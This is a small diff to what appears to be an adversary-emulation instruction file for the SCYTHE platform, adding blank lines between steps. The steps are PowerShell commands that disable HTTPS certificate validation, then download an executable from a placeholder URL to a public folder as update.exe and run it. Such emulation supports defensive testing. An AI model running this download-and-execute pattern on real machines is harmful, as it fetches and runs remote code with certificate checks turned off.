@@ -15,7 +15,11 @@ To emulate:
 10. Execute update.exe
 
 Note, to get around HTTPS certificate validation issues:
+
 Open a PowerShell command prompt
+
 PS C:\Users\LocalUser> [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
+
 PS C:\Users\LocalUser> (New-Object Net.WebClient).DownloadFile('<SCYTHE EXE URL>','C:\Users\Public\update.exe')
+
 PS C:\Users\LocalUser> C:\Users\Public\update.exe
